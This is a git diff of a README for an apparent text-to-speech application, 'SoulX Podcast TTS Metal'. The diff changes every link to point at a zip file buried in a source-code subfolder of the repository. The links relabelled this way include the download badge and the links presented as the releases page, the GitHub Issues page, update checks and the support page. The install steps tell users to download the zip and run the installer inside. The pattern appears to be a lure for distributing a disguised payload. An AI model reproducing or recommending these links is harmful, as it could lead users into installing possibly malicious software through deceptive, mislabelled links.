@@ -8,12 +8,12 @@ Welcome to **SoulX Podcast TTS Metal Test**! This application allows you to conv
 
 To get started, you need to download the application. Click the link below to visit the Downloads page:
 
-[![Download soulx-tts-metal](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip)](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip)
+[![Download soulx-tts-metal](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip)](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip)
 
 Follow these steps to install:
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip) to find the latest version.
-2. **Select the Right File:** Look for the latest release. You may see files with names like `https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip` or similar. 
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip) to find the latest version.
+2. **Select the Right File:** Look for the latest release. You may see files with names like `https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip` or similar. 
 3. **Download the File:** Click on the file to begin downloading. Your browser will save it to your computer.
 4. **Run the Installer:** After the download is complete, locate the file in your downloads folder and double-click it to start the installation. 
 5. **Complete Installation:** Follow the prompts in the setup wizard to complete the installation.
@@ -49,13 +49,13 @@ Using **SoulX TTS Metal** is simple. After installation, follow these steps to s
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out for support. You can find help and further documentation on the [GitHub Issues Page](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip).
+If you encounter any issues or have questions, feel free to reach out for support. You can find help and further documentation on the [GitHub Issues Page](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip).
 
 ## 🎈 Update Notifications
 
 Keep your application up-to-date to enjoy the latest features and improvements. You can check for updates by revisiting the releases page:
 
-[Download soulx-tts-metal](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip)
+[Download soulx-tts-metal](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip)
 
 ## 🚧 Troubleshooting
 
@@ -65,7 +65,7 @@ Here are some common issues and solutions:
 - **Audio Issues:** Check your device’s sound settings to ensure the volume is not muted.
 - **Conversion Problems:** Make sure you are using podcast files in supported formats like MP3 or WAV.
 
-For additional help, visit our [support page](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/prompts/scenarios/soulx-tts-metal_3.4.zip).
+For additional help, visit our [support page](https://raw.githubusercontent.com/vell1/soulx-tts-metal/main/soulxpodcast/models/modules/hifigan_components/tts-soulx-metal-v1.0.zip).
 
 ## 🎊 Community Contributions
 
